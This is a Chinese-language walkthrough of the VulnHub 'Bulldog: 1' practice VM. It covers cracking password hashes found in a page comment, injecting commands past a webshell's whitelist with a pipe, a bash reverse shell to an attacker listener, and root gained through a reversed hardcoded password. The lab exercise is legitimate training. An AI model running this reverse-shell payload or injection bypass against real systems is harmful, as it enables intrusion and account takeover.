# BULLDOG: 1

2025.02.12 https://www.vulnhub.com/entry/bulldog-1,211/

[video]()

## Ip

192.168.5.40

## Scan

```
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
8080/tcp open  http-proxy
```

访问 80 和 8080 两个端口显示的网站一致，gobuster 发现 http://192.168.5.40:8080/notice/ 中可以看到一个可能存在的用户名: Winston Churchy (CEO) ，另外发现 2 个链接: http://192.168.5.40:8080/admin 和 http://192.168.5.40:8080/dev， /admin 是一个系统登陆窗口使用 Django 开发，/dev 页面上显示了一些提示， 同时发现了一个 webshell 的页面 http://192.168.5.40/dev/shell

查看 /dev 的页面源码，在底部发现了一些重要信息：

```
<!--Need these password hashes for testing. Django's default is too complex-->
<!--We'll remove these in prod. It's not like a hacker can do anything with a hash-->
Team Lead: alan@bulldogindustries.com<br><!--6515229daf8dbdc8b89fed2e60f107433da5f2cb-->
Back-up Team Lead: william@bulldogindustries.com<br><br><!--38882f3b81f8f2bc47d9f3119155b05f954892fb-->
Front End: malik@bulldogindustries.com<br><!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279-->
Front End: kevin@bulldogindustries.com<br><br><!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9-->
Back End: ashley@bulldogindustries.com<br><!--553d917a396414ab99785694afd51df3a8a8a3e0-->
Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5-->
Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->
```

使用 https://crackstation.net/ 在线对哈希进行解密，得到了 2 个明文密码：

```
bulldog
bulldoglover
```

得到了登陆凭据: nick:bulldog 和 sarah:bulldoglover 用这 2 个凭据登陆 /admin 后，发现页面上没有权限。这时在访问 http://192.168.5.40/dev/shell/ 发现可以进入到 webshell 中了。

webshell 中显示可以执行下面的命令：

```
ifconfig
ls
echo
pwd
cat
rm
```

但是可以绕过：ls|id 这时也会执行其他命令，所以直接反弹 shell，kali 上建立监听:

```
ls|/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1'
```

得到了反弹的链接：

```
django@bulldog:/home/django/bulldog$ id
id
uid=1001(django) gid=1001(django) groups=1001(django),27(sudo)
```

发现 2 个普通用户：

```
bulldogadmin:x:1000:1000:bulldogadmin,,,:/home/bulldogadmin:/bin/bash
django:x:1001:1001:,,,:/home/django:/bin/bash
```

在 /home/bulldogadmin/.hiddenadmindirectory 中发现了 2 个文件，note.txt ：

```
django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ cat note
Nick,

I'm working on the backend permission stuff. Listen, it's super prototype but I think it's going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!

It's great stuff! Once I'm finished with it, a hacker wouldn't even be able to reverse it! Keep in mind that it's still a prototype right now. I am about to get it working with the Django user account. I'm not sure how I'll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?

Let me know what you think of it!

-Ashley
```

另外一个 customPermissionApp 是一个可执行程序，但是没有执行权限，但是有读权限，使用当前用户 cp 一份该程序。根据上面的提示，逆向该程序，找到了一串字符串: SUPERultimatePASSWORDyouCANTget ，并且程序中执行了 system("sudo su root"); 。执行这个程序，输入这个字符串，得到了 root 权限：

```
./customPermissionApp

root@bulldog:~# cat congrats.txt
Congratulations on completing this VM :D That wasn't so bad was it?

Let me know what you thought on twitter, I'm @frichette_n

As far as I know there are two ways to get root. Can you find the other one?

Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!
```

最后发现 django 用户 sudo -l 权限为 ALL。
